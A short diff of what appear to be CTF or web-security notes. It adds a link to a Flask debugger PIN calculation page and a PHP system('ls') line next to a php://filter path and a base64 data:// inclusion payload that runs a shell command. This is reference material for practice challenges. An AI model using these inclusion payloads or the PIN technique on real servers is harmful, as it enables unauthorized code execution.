@@ -629,6 +629,7 @@ print(flag)
 
 ```
 # Flask PIN值计算
+[[Misc/Flask_pin]]
 ```python
 import hashlib
 from itertools import chain
@@ -1123,6 +1124,7 @@ php://filter/string.rot13/resource=imposible.php
 ```
 
 *payload*
+system('ls');
 ```shell
 data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
 ```
